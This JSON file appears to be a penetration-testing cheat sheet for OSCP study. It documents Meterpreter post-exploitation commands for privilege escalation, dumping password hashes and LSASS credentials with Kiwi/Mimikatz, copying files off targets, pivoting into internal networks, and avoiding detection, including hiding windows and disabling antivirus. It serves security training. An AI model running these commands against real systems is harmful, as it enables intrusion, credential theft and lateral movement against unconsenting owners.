{
  "category": "exploitation",
  "commands": [
    {
      "id": "meterpreter-help",
      "name": "Display Meterpreter Help",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "help",
      "description": "List all available Meterpreter commands organized by category",
      "tags": [
        "METASPLOIT",
        "METERPRETER",
        "HELP"
      ],
      "variables": [],
      "flag_explanations": {},
      "success_indicators": [
        "Command categories displayed (Core, Stdapi, etc)",
        "Commands listed with descriptions"
      ],
      "failure_indicators": [
        "Not in Meterpreter session"
      ],
      "next_steps": [],
      "alternatives": [],
      "prerequisites": [],
      "troubleshooting": {},
      "notes": "Commands organized by category:\nCore Commands, File System, System, Networking, Webcam, Audio, Sniffer, etc.\n\nUse 'help <command>' for detailed syntax.",
      "oscp_relevance": "medium"
    },
    {
      "id": "meterpreter-background",
      "name": "Background Meterpreter Session",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "background",
      "description": "Send current Meterpreter session to background and return to msfconsole",
      "tags": [
        "METASPLOIT",
        "METERPRETER",
        "SESSION_MANAGEMENT"
      ],
      "variables": [],
      "flag_explanations": {},
      "success_indicators": [
        "Backgrounding session <ID>",
        "Returns to msf6 exploit(...)> prompt"
      ],
      "failure_indicators": [],
      "next_steps": [
        "msf-session-interact"
      ],
      "alternatives": [],
      "prerequisites": [],
      "troubleshooting": {},
      "notes": "Session remains active in background.\n\nReturn with:\nsessions -i <ID>.\n\nUse Ctrl+Z as quick shortcut.",
      "oscp_relevance": "high"
    },
    {
      "id": "meterpreter-sysinfo",
      "name": "Display System Information",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "sysinfo",
      "description": "Get target system information (OS, architecture, computer name, domain)",
      "tags": [
        "METASPLOIT",
        "METERPRETER",
        "ENUMERATION",
        "SYSTEM_INFO"
      ],
      "variables": [],
      "flag_explanations": {},
      "success_indicators": [
        "Computer name displayed",
        "OS details shown",
        "Architecture (x86/x64)",
        "System Language",
        "Domain/Workgroup"
      ],
      "failure_indicators": [
        "Command failed"
      ],
      "next_steps": [
        "meterpreter-getuid",
        "meterpreter-ps"
      ],
      "alternatives": [],
      "prerequisites": [],
      "troubleshooting": {},
      "notes": "First command to run after gaining Meterpreter access.\n\nProvides OS version for exploit/privesc selection.\n\nShows domain membership for lateral movement planning.",
      "oscp_relevance": "high"
    },
    {
      "id": "meterpreter-getuid",
      "name": "Get Current User Context",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "getuid",
      "description": "Display username and privileges of current Meterpreter process",
      "tags": [
        "METASPLOIT",
        "METERPRETER",
        "ENUMERATION",
        "USER"
      ],
      "variables": [],
      "flag_explanations": {},
      "success_indicators": [
        "Server username displayed (DOMAIN\\user format on Windows)",
        "Privilege level indicated"
      ],
      "failure_indicators": [
        "Command failed"
      ],
      "next_steps": [
        "meterpreter-getsystem",
        "meterpreter-getprivs"
      ],
      "alternatives": [],
      "prerequisites": [],
      "troubleshooting": {},
      "notes": "Check immediately to determine privilege escalation needs.\n\nNT AUTHORITY\\SYSTEM = highest Windows privileges.\n\nRoot = highest Linux privileges.",
      "oscp_relevance": "high"
    },
    {
      "id": "meterpreter-getprivs",
      "name": "Display Current Privileges",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "getprivs",
      "description": "List all privileges enabled for current process (Windows only)",
      "tags": [
        "METASPLOIT",
        "METERPRETER",
        "PRIVILEGES",
        "WINDOWS"
      ],
      "variables": [],
      "flag_explanations": {},
      "success_indicators": [
        "Enabled Process Privileges list",
        "Privilege names shown (SeDebugPrivilege, SeImpersonatePrivilege, etc)"
      ],
      "failure_indicators": [
        "Not supported on this platform (Linux)"
      ],
      "next_steps": [
        "meterpreter-getsystem"
      ],
      "alternatives": [],
      "prerequisites": [],
      "troubleshooting": {
        "linux_not_supported": "Command is Windows-only - use 'shell' and traditional Linux enumeration"
      },
      "notes": "Key privileges:\nSeImpersonatePrivilege (token impersonation), SeDebugPrivilege (process debugging), SeBackupPrivilege (file access).\n\nUse for identifying privesc paths.",
      "oscp_relevance": "high"
    },
    {
      "id": "meterpreter-getsystem",
      "name": "Escalate to SYSTEM Privileges",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "getsystem",
      "description": "Attempt privilege escalation to NT AUTHORITY\\SYSTEM using multiple techniques",
      "tags": [
        "METASPLOIT",
        "METERPRETER",
        "PRIVESC",
        "WINDOWS",
        "SYSTEM"
      ],
      "variables": [],
      "flag_explanations": {
        "getsystem": "Try all techniques automatically",
        "getsystem -t 0": "Technique 0: Token Duplication",
        "getsystem -t 1": "Technique 1: Named Pipe Impersonation (In Memory/Admin)",
        "getsystem -t 2": "Technique 2: Named Pipe Impersonation (Dropper/Admin)",
        "getsystem -t 3": "Technique 3: Named Pipe Impersonation (RPCSS variant)",
        "getsystem -t 4": "Technique 4: Named Pipe Impersonation (PrintSpooler variant)"
      },
      "success_indicators": [
        "got system via technique N",
        "Server username: NT AUTHORITY\\SYSTEM"
      ],
      "failure_indicators": [
        "Operation failed",
        "Access denied",
        "Insufficient privileges"
      ],
      "next_steps": [
        "meterpreter-hashdump",
        "meterpreter-load-kiwi"
      ],
      "alternatives": [],
      "prerequisites": [],
      "troubleshooting": {
        "all_techniques_failed": "Requires SeImpersonatePrivilege or SeDebugPrivilege - check with getprivs",
        "access_denied": "Current user must be local administrator",
        "technique_blocked": "Try specific technique: getsystem -t <NUMBER>"
      },
      "notes": "Requires local admin privileges.\n\nTechniques use named pipe impersonation or token duplication.\n\nPrintSpooler variant (technique 4) most reliable on modern Windows.",
      "oscp_relevance": "high"
    },
    {
      "id": "meterpreter-ps",
      "name": "List Running Processes",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "ps",
      "description": "Display all running processes with PID, name, architecture, session, user, and path",
      "tags": [
        "METASPLOIT",
        "METERPRETER",
        "ENUMERATION",
        "PROCESSES"
      ],
      "variables": [],
      "flag_explanations": {},
      "success_indicators": [
        "Process list with columns: PID, PPID, Name, Arch, Session, User, Path",
        "Current process highlighted"
      ],
      "failure_indicators": [
        "Access denied (insufficient privileges)"
      ],
      "next_steps": [
        "meterpreter-migrate"
      ],
      "alternatives": [],
      "prerequisites": [],
      "troubleshooting": {
        "incomplete_list": "Some processes hidden if not running as SYSTEM"
      },
      "notes": "Identify stable processes for migration (explorer.exe, svchost.exe).\n\nLook for user-owned processes to match integrity level.\n\nNote architecture (x86 vs x64) for migration compatibility.",
      "oscp_relevance": "high"
    },
    {
      "id": "meterpreter-migrate",
      "name": "Migrate to Different Process",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "migrate <PID>",
      "description": "Move Meterpreter execution to different process for stability and stealth",
      "tags": [
        "METASPLOIT",
        "METERPRETER",
        "PROCESS_MIGRATION",
        "PERSISTENCE"
      ],
      "variables": [
        {
          "name": "<PID>",
          "description": "Process ID to migrate into (from 'ps' output)",
          "example": "1234",
          "required": true
        }
      ],
      "flag_explanations": {},
      "success_indicators": [
        "Migrating from <OLD_PID> to <NEW_PID>",
        "Migration completed successfully",
        "ps shows current process changed"
      ],
      "failure_indicators": [
        "Migration failed",
        "Access denied",
        "Process died during migration"
      ],
      "next_steps": [
        "meterpreter-getuid"
      ],
      "alternatives": [],
      "prerequisites": [
        "meterpreter-ps"
      ],
      "troubleshooting": {
        "access_denied": "Can only migrate to processes at same/lower privilege level",
        "architecture_mismatch": "Cannot migrate x64 Meterpreter to x86 process (or vice versa)",
        "process_died": "Target process crashed - choose more stable process",
        "lost_privileges": "Migrated to lower-privilege process - use getsystem first if needed"
      },
      "notes": "Migrate ASAP after initial access to prevent session loss.\n\nChoose long-running stable processes (explorer.exe, svchost.exe).\n\nMatch architecture.\n\nMigration changes user context.",
      "oscp_relevance": "high",
      "methodology_guidance": {
        "after_success": "post/windows/manage/migrate"
      },
      "filled_example": "migrate 1234"
    },
    {
      "id": "meterpreter-execute",
      "name": "Execute Program on Target",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "execute -f <PROGRAM> -a '<ARGS>' -i -H",
      "description": "Start program on target system with optional arguments, interaction, and hidden window",
      "tags": [
        "METASPLOIT",
        "METERPRETER",
        "EXECUTION"
      ],
      "variables": [
        {
          "name": "<PROGRAM>",
          "description": "Program to execute (full path or command name)",
          "example": "notepad.exe",
          "required": true
        },
        {
          "name": "<ARGS>",
          "description": "Command-line arguments (optional)",
          "example": "C:\\temp\\file.txt",
          "required": false
        }
      ],
      "flag_explanations": {
        "-f": "File/program to execute",
        "-a": "Arguments to pass to program",
        "-H": "Create hidden process (no window)",
        "-i": "Interact with process (channels I/O)",
        "-c": "Channelize input/output",
        "-t": "Execute with currently impersonated thread token"
      },
      "success_indicators": [
        "Process <PID> created",
        "Channel <ID> created (if -i used)"
      ],
      "failure_indicators": [
        "Execution failed",
        "File not found",
        "Access denied"
      ],
      "next_steps": [
        "meterpreter-ps",
        "meterpreter-migrate"
      ],
      "alternatives": [],
      "prerequisites": [],
      "troubleshooting": {
        "file_not_found": "Use full path for executables not in PATH",
        "window_appears": "Use -H flag to hide window from user",
        "access_denied": "Insufficient privileges to execute in specified location"
      },
      "notes": "Use -H to avoid alerting user.\n\nCommon uses:\nexecute -f notepad.exe -H (hidden notepad for migration target), execute -f cmd.exe -i (interactive shell).",
      "oscp_relevance": "medium",
      "filled_example": "execute -f notepad.exe -a 'C:\\temp\\file.txt' -i -H"
    },
    {
      "id": "meterpreter-shell",
      "name": "Drop to System Shell",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "shell",
      "description": "Open interactive system shell (cmd.exe on Windows, /bin/sh on Linux)",
      "tags": [
        "METASPLOIT",
        "METERPRETER",
        "SHELL",
        "INTERACTIVE"
      ],
      "variables": [],
      "flag_explanations": {},
      "success_indicators": [
        "Process created",
        "Channel created",
        "System shell prompt appears (C:\\>, $, #)"
      ],
      "failure_indicators": [
        "Failed to spawn shell",
        "Channel creation failed"
      ],
      "next_steps": [],
      "alternatives": [],
      "prerequisites": [],
      "troubleshooting": {
        "no_prompt": "Shell may be waiting for input - try pressing Enter",
        "exit_meterpreter": "DO NOT type 'exit' - use Ctrl+Z to return to Meterpreter",
        "session_hung": "Background with Ctrl+Z if shell hangs"
      },
      "notes": "Creates channel for shell I/O.\n\nUse Ctrl+Z to background shell and return to Meterpreter (don't use 'exit' which kills channel).\n\nShell runs in current process context.",
      "oscp_relevance": "high"
    },
    {
      "id": "meterpreter-pwd",
      "name": "Print Working Directory",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "pwd",
      "description": "Display current working directory on target system",
      "tags": [
        "METASPLOIT",
        "METERPRETER",
        "FILE_SYSTEM",
        "NAVIGATION"
      ],
      "variables": [],
      "flag_explanations": {},
      "success_indicators": [
        "Current directory path displayed"
      ],
      "failure_indicators": [],
      "next_steps": [
        "meterpreter-ls",
        "meterpreter-cd"
      ],
      "alternatives": [],
      "prerequisites": [],
      "troubleshooting": {},
      "notes": "Shows target system's current directory, not local machine.\n\nUse before file operations to verify location.",
      "oscp_relevance": "medium"
    },
    {
      "id": "meterpreter-ls",
      "name": "List Directory Contents",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "ls <PATH>",
      "description": "List files and directories at specified path or current directory",
      "tags": [
        "METASPLOIT",
        "METERPRETER",
        "FILE_SYSTEM",
        "ENUMERATION"
      ],
      "variables": [
        {
          "name": "<PATH>",
          "description": "Directory path to list (optional, defaults to pwd)",
          "example": "C:\\Users\\Administrator\\Desktop",
          "required": false
        }
      ],
      "flag_explanations": {
        "-S": "Search recursively",
        "-r": "List recursively"
      },
      "success_indicators": [
        "Directory listing with Mode, Size, Type, Last modified, Name"
      ],
      "failure_indicators": [
        "Access denied",
        "Directory not found"
      ],
      "next_steps": [
        "meterpreter-download",
        "meterpreter-cat"
      ],
      "alternatives": [],
      "prerequisites": [],
      "troubleshooting": {
        "access_denied": "Insufficient permissions to read directory",
        "windows_paths": "Escape backslashes or use forward slashes: C:/Users or C:\\\\Users"
      },
      "notes": "Look for sensitive files:\nproof.txt, local.txt, passwords, .config, .ssh, database files.\n\nUse -r for recursive listing.",
      "oscp_relevance": "high",
      "filled_example": "ls C:\\Users\\Administrator\\Desktop"
    },
    {
      "id": "meterpreter-cd",
      "name": "Change Directory",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "cd <PATH>",
      "description": "Change current working directory on target system",
      "tags": [
        "METASPLOIT",
        "METERPRETER",
        "FILE_SYSTEM",
        "NAVIGATION"
      ],
      "variables": [
        {
          "name": "<PATH>",
          "description": "Directory path to change to",
          "example": "C:\\Users\\Administrator",
          "required": true
        }
      ],
      "flag_explanations": {},
      "success_indicators": [
        "Changed directory confirmed (no output = success)",
        "pwd shows new directory"
      ],
      "failure_indicators": [
        "Directory not found",
        "Access denied"
      ],
      "next_steps": [
        "meterpreter-ls",
        "meterpreter-pwd"
      ],
      "alternatives": [],
      "prerequisites": [],
      "troubleshooting": {
        "windows_paths": "Use forward slashes (C:/Users) or escaped backslashes (C:\\\\Users)"
      },
      "notes": "Navigate to user directories, Desktop, Documents for sensitive files.\n\nCommon targets:\nC:/Users/<USER>/Desktop, /home/<USER>, /root",
      "oscp_relevance": "medium",
      "filled_example": "cd C:\\Users\\Administrator"
    },
    {
      "id": "meterpreter-download",
      "name": "Download File from Target",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "download <REMOTE_FILE> <LOCAL_PATH>",
      "description": "Transfer file from target system to attacker machine",
      "tags": [
        "METASPLOIT",
        "METERPRETER",
        "FILE_TRANSFER",
        "EXFILTRATION"
      ],
      "variables": [
        {
          "name": "<REMOTE_FILE>",
          "description": "Path to file on target system",
          "example": "C:\\Users\\Administrator\\Desktop\\proof.txt",
          "required": true
        },
        {
          "name": "<LOCAL_PATH>",
          "description": "Local destination path (optional, defaults to current directory)",
          "example": "/home/kali/loot/proof.txt",
          "required": false
        }
      ],
      "flag_explanations": {
        "-r": "Recursively download directory"
      },
      "success_indicators": [
        "Downloading: <file>",
        "Downloaded <size> of <size>",
        "download: <remote> -> <local>"
      ],
      "failure_indicators": [
        "File not found",
        "Access denied",
        "Download failed"
      ],
      "next_steps": [],
      "alternatives": [],
      "prerequisites": [
        "meterpreter-ls"
      ],
      "troubleshooting": {
        "access_denied": "File may be locked or insufficient permissions",
        "large_file_slow": "Meterpreter download can be slow - consider alternative methods for large files",
        "local_path_error": "Ensure local destination directory exists"
      },
      "notes": "Download proof flags, sensitive files, SAM database, configuration files.\n\nUse -r for directories.\n\nChange local directory first with 'lcd'.",
      "oscp_relevance": "high",
      "filled_example": "download C:\\Users\\Administrator\\Desktop\\proof.txt /home/kali/loot/proof.txt"
    },
    {
      "id": "meterpreter-upload",
      "name": "Upload File to Target",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "upload <LOCAL_FILE> <REMOTE_PATH>",
      "description": "Transfer file from attacker machine to target system",
      "tags": [
        "METASPLOIT",
        "METERPRETER",
        "FILE_TRANSFER",
        "TOOLS"
      ],
      "variables": [
        {
          "name": "<LOCAL_FILE>",
          "description": "Path to file on attacker machine",
          "example": "/usr/bin/unix-privesc-check",
          "required": true
        },
        {
          "name": "<REMOTE_PATH>",
          "description": "Destination path on target",
          "example": "C:\\Temp\\privesc.exe",
          "required": true
        }
      ],
      "flag_explanations": {
        "-r": "Recursively upload directory"
      },
      "success_indicators": [
        "Uploading: <file>",
        "Uploaded <size> of <size>",
        "upload: <local> -> <remote>"
      ],
      "failure_indicators": [
        "File not found (local)",
        "Access denied (remote)",
        "Upload failed"
      ],
      "next_steps": [
        "meterpreter-execute"
      ],
      "alternatives": [],
      "prerequisites": [],
      "troubleshooting": {
        "access_denied": "Upload to writable directory: C:\\Windows\\Temp, C:\\Temp, /tmp",
        "large_file_slow": "Meterpreter upload can be slow - consider hosting HTTP server",
        "file_locked": "Cannot overwrite running executables - use different filename",
        "windows_backslash": "Escape backslashes: C:\\\\Temp or use forward slashes: C:/Temp"
      },
      "notes": "Upload privilege escalation tools, persistence payloads, enumeration scripts.\n\nCommon targets:\n/tmp (Linux), C:\\Windows\\Temp (Windows).",
      "oscp_relevance": "high",
      "filled_example": "upload /usr/bin/unix-privesc-check C:\\Temp\\privesc.exe"
    },
    {
      "id": "meterpreter-cat",
      "name": "Display File Contents",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "cat <FILE>",
      "description": "Read and display file contents from target system",
      "tags": [
        "METASPLOIT",
        "METERPRETER",
        "FILE_SYSTEM",
        "READ"
      ],
      "variables": [
        {
          "name": "<FILE>",
          "description": "Path to file on target",
          "example": "C:\\Users\\Administrator\\Desktop\\proof.txt",
          "required": true
        }
      ],
      "flag_explanations": {},
      "success_indicators": [
        "File contents displayed"
      ],
      "failure_indicators": [
        "File not found",
        "Access denied"
      ],
      "next_steps": [],
      "alternatives": [],
      "prerequisites": [],
      "troubleshooting": {
        "binary_file": "Binary files will display garbage - use download instead",
        "large_file": "cat displays entire file - use download for large files"
      },
      "notes": "Quick way to read flags, passwords, config files.\n\nFor binary files or large files, use download instead.",
      "oscp_relevance": "high",
      "filled_example": "cat C:\\Users\\Administrator\\Desktop\\proof.txt"
    },
    {
      "id": "meterpreter-search",
      "name": "Search for Files",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "search -f <FILENAME> -d <DIRECTORY>",
      "description": "Search target filesystem for files matching pattern",
      "tags": [
        "METASPLOIT",
        "METERPRETER",
        "FILE_SYSTEM",
        "SEARCH"
      ],
      "variables": [
        {
          "name": "<FILENAME>",
          "description": "Filename pattern to search for (supports wildcards)",
          "example": "*.txt",
          "required": true
        },
        {
          "name": "<DIRECTORY>",
          "description": "Starting directory for search (optional)",
          "example": "C:\\Users",
          "required": false
        }
      ],
      "flag_explanations": {
        "-f": "Filename pattern (supports * wildcard)",
        "-d": "Directory to search",
        "-r": "Search recursively (default: true)"
      },
      "success_indicators": [
        "Found files list with full paths",
        "Size and modification date shown"
      ],
      "failure_indicators": [
        "No files found",
        "Access denied to directories"
      ],
      "next_steps": [
        "meterpreter-download",
        "meterpreter-cat"
      ],
      "alternatives": [],
      "prerequisites": [],
      "troubleshooting": {
        "search_very_slow": "Searching entire drive takes time - narrow search with -d",
        "access_denied_paths": "Some directories inaccessible - normal with limited privileges"
      },
      "notes": "Common searches:\n-f proof.txt, -f local.txt, -f *.kdbx, -f *.config, -f *password*.\n\nSearch can be slow on large filesystems.",
      "oscp_relevance": "high",
      "filled_example": "search -f *.txt -d C:\\Users"
    },
    {
      "id": "meterpreter-hashdump",
      "name": "Dump Password Hashes",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "hashdump",
      "description": "Extract password hashes from Windows SAM database (requires SYSTEM privileges)",
      "tags": [
        "METASPLOIT",
        "METERPRETER",
        "CREDENTIALS",
        "HASHDUMP",
        "WINDOWS"
      ],
      "variables": [],
      "flag_explanations": {},
      "success_indicators": [
        "Username:RID:LM_hash:NTLM_hash::: format",
        "Multiple user hashes displayed",
        "Hashes stored in database"
      ],
      "failure_indicators": [
        "Operation failed: Access denied",
        "Priv::Edom error",
        "Not running as SYSTEM"
      ],
      "next_steps": [
        "hashcat-crack",
        "msf-db-creds"
      ],
      "alternatives": [],
      "prerequisites": [
        "meterpreter-getsystem"
      ],
      "troubleshooting": {
        "access_denied": "Must run as NT AUTHORITY\\SYSTEM - use getsystem first",
        "priv_error": "Migrate to SYSTEM process before hashdump"
      },
      "notes": "Requires SYSTEM privileges.\n\nDumps LM and NTLM hashes.\n\nHashes automatically stored in Metasploit database.\n\nUse hashcat or John to crack offline.",
      "oscp_relevance": "high"
    },
    {
      "id": "meterpreter-load-kiwi",
      "name": "Load Kiwi Extension (Mimikatz)",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "load kiwi",
      "description": "Load Kiwi extension providing Mimikatz capabilities for credential extraction",
      "tags": [
        "METASPLOIT",
        "METERPRETER",
        "KIWI",
        "MIMIKATZ",
        "CREDENTIALS"
      ],
      "variables": [],
      "flag_explanations": {},
      "success_indicators": [
        "Mimikatz ASCII art displayed",
        "Success message",
        "New Kiwi commands available in help"
      ],
      "failure_indicators": [
        "Failed to load extension",
        "Extension not found"
      ],
      "next_steps": [],
      "alternatives": [],
      "prerequisites": [],
      "troubleshooting": {
        "load_failed": "Ensure running as administrator or SYSTEM",
        "av_detected": "Kiwi/Mimikatz often detected by AV - disable AV or use alternatives"
      },
      "notes": "Kiwi is Metasploit's implementation of Mimikatz.\n\nProvides commands:\ncreds_all, lsa_dump_sam, dcsync, golden_ticket_create, etc.\n\nOften flagged by AV/EDR.",
      "oscp_relevance": "high",
      "methodology_guidance": {
        "after_success": "meterpreter-kiwi-creds_all"
      }
    },
    {
      "id": "meterpreter-kiwi-creds-all",
      "name": "Dump All Credentials with Kiwi",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "creds_all",
      "description": "Extract all available credentials from memory using Kiwi (after loading)",
      "tags": [
        "METASPLOIT",
        "METERPRETER",
        "KIWI",
        "CREDENTIALS",
        "MEMORY"
      ],
      "variables": [],
      "flag_explanations": {
        "creds_all": "Dump all credential types",
        "creds_msv": "Dump MSV credentials only (LM/NTLM)",
        "creds_wdigest": "Dump WDigest credentials (cleartext if enabled)",
        "creds_kerberos": "Dump Kerberos tickets",
        "creds_livessp": "Dump LiveSSP credentials"
      },
      "success_indicators": [
        "Credentials table with Username, Domain, NTLM, SHA1",
        "Multiple credential types extracted"
      ],
      "failure_indicators": [
        "Kiwi not loaded",
        "Access denied",
        "No credentials found"
      ],
      "next_steps": [
        "msf-db-creds"
      ],
      "alternatives": [],
      "prerequisites": [
        "meterpreter-load-kiwi"
      ],
      "troubleshooting": {
        "no_cleartext": "WDigest disabled on modern Windows - only hashes available",
        "kiwi_not_loaded": "Load Kiwi first with: load kiwi"
      },
      "notes": "Extracts credentials from LSASS memory.\n\nRequires admin/SYSTEM.\n\nResults automatically stored in Metasploit database.\n\nUse msf-db-creds to view.",
      "oscp_relevance": "high"
    },
    {
      "id": "meterpreter-screenshot",
      "name": "Capture Screenshot",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "screenshot",
      "description": "Capture screenshot of target system's current desktop",
      "tags": [
        "METASPLOIT",
        "METERPRETER",
        "SCREENSHOT",
        "SURVEILLANCE"
      ],
      "variables": [],
      "flag_explanations": {
        "-v": "View screenshot immediately after capture"
      },
      "success_indicators": [
        "Screenshot saved to: <path>",
        "Image file created locally"
      ],
      "failure_indicators": [
        "Screenshot failed",
        "No active desktop session"
      ],
      "next_steps": [],
      "alternatives": [],
      "prerequisites": [],
      "troubleshooting": {
        "no_desktop": "Requires active desktop session - check if user logged in",
        "black_screen": "Screen may be locked or user switched"
      },
      "notes": "Useful for documentation and identifying sensitive information on screen.\n\nSaved to ~/.msf4/loot/ by default.\n\nRequires active desktop session.",
      "oscp_relevance": "low",
      "methodology_guidance": {
        "after_success": "post/windows/gather/screen_spy"
      }
    },
    {
      "id": "meterpreter-idletime",
      "name": "Check User Idle Time",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "idletime",
      "description": "Display how long user has been idle (no keyboard/mouse input)",
      "tags": [
        "METASPLOIT",
        "METERPRETER",
        "ENUMERATION",
        "OPSEC"
      ],
      "variables": [],
      "flag_explanations": {},
      "success_indicators": [
        "User has been idle for: X mins Y secs"
      ],
      "failure_indicators": [
        "Command failed"
      ],
      "next_steps": [],
      "alternatives": [],
      "prerequisites": [],
      "troubleshooting": {},
      "notes": "Use to determine if user is actively at computer.\n\nHigh idle time = safer to run visible commands without detection.\n\nCheck before screenshot, keylogging, or GUI manipulation.",
      "oscp_relevance": "medium"
    },
    {
      "id": "meterpreter-route-add",
      "name": "Add Route to Internal Network",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "run autoroute -s <SUBNET>/<NETMASK>",
      "description": "Add routing through compromised host to reach internal network",
      "tags": [
        "METASPLOIT",
        "METERPRETER",
        "PIVOTING",
        "ROUTING",
        "LATERAL_MOVEMENT"
      ],
      "variables": [
        {
          "name": "<SUBNET>",
          "description": "Internal network subnet",
          "example": "172.16.5.0",
          "required": true
        },
        {
          "name": "<NETMASK>",
          "description": "Network mask (CIDR notation)",
          "example": "24",
          "required": true
        }
      ],
      "flag_explanations": {
        "-s": "Add subnet route",
        "-p": "Print current routes",
        "-d": "Delete route"
      },
      "success_indicators": [
        "Route added successfully",
        "run autoroute -p shows new route"
      ],
      "failure_indicators": [
        "Route add failed",
        "Invalid subnet"
      ],
      "next_steps": [
        "msf-aux-portscan-tcp"
      ],
      "alternatives": [],
      "prerequisites": [],
      "troubleshooting": {
        "route_not_working": "Verify target has interface on internal network with ifconfig/ipconfig"
      },
      "notes": "Enables Metasploit modules to target internal networks through compromised host.\n\nUse 'run autoroute -p' to view routes.\n\nCombine with SOCKS proxy for external tool access.",
      "oscp_relevance": "high",
      "filled_example": "run autoroute -s 172.16.5.0/24"
    },
    {
      "id": "meterpreter-portfwd-add",
      "name": "Forward Port Through Compromised Host",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "portfwd add -l <LOCAL_PORT> -p <REMOTE_PORT> -r <REMOTE_HOST>",
      "description": "Create port forward from attacker machine through compromised host to internal target",
      "tags": [
        "METASPLOIT",
        "METERPRETER",
        "PIVOTING",
        "PORT_FORWARD"
      ],
      "variables": [
        {
          "name": "<LOCAL_PORT>",
          "description": "Local port on attacker machine to listen on",
          "example": "3389",
          "required": true
        },
        {
          "name": "<REMOTE_PORT>",
          "description": "Port on internal target",
          "example": "3389",
          "required": true
        },
        {
          "name": "<REMOTE_HOST>",
          "description": "Internal target IP address",
          "example": "172.16.5.100",
          "required": true
        }
      ],
      "flag_explanations": {
        "add": "Create new port forward",
        "-l": "Local port (attacker machine)",
        "-p": "Remote port (target)",
        "-r": "Remote host (target IP)",
        "list": "Show active port forwards",
        "delete": "Remove port forward"
      },
      "success_indicators": [
        "Local TCP relay created: :<local_port> <-> <remote_host>:<remote_port>",
        "portfwd list shows new forward"
      ],
      "failure_indicators": [
        "Forward creation failed",
        "Port already in use"
      ],
      "next_steps": [],
      "alternatives": [],
      "prerequisites": [],
      "troubleshooting": {
        "port_in_use": "Choose different local port",
        "connection_refused": "Verify remote host/port accessible from compromised host"
      },
      "notes": "Example:\nForward RDP:\nportfwd add -l 3389 -p 3389 -r 172.16.5.100, then connect to localhost:3389.\n\nList forwards:\nportfwd list.\n\nDelete:\nportfwd delete -l <port>",
      "oscp_relevance": "high",
      "filled_example": "portfwd add -l 3389 -p 3389 -r 172.16.5.100"
    },
    {
      "id": "meterpreter-ipconfig",
      "name": "Display Network Configuration",
      "category": "exploitation",
      "subcategory": "metasploit",
      "command": "ipconfig",
      "description": "Display network interfaces, IP addresses, and routing info on compromised host",
      "tags": [
        "METASPLOIT",
        "METERPRETER",
        "ENUMERATION",
        "NETWORKING",
        "OSCP:HIGH"
      ],
      "variables": [],
      "flag_explanations": {},
      "success_indicators": [
        "Interface Name displayed",
        "IP Address shown",
        "Subnet Mask shown"
      ],
      "failure_indicators": [
        "Command failed"
      ],
      "notes": "Critical for identifying internal networks for pivoting. Look for multiple interfaces indicating dual-homed host. Use with autoroute for lateral movement.",
      "oscp_relevance": "high"
    }
  ]
}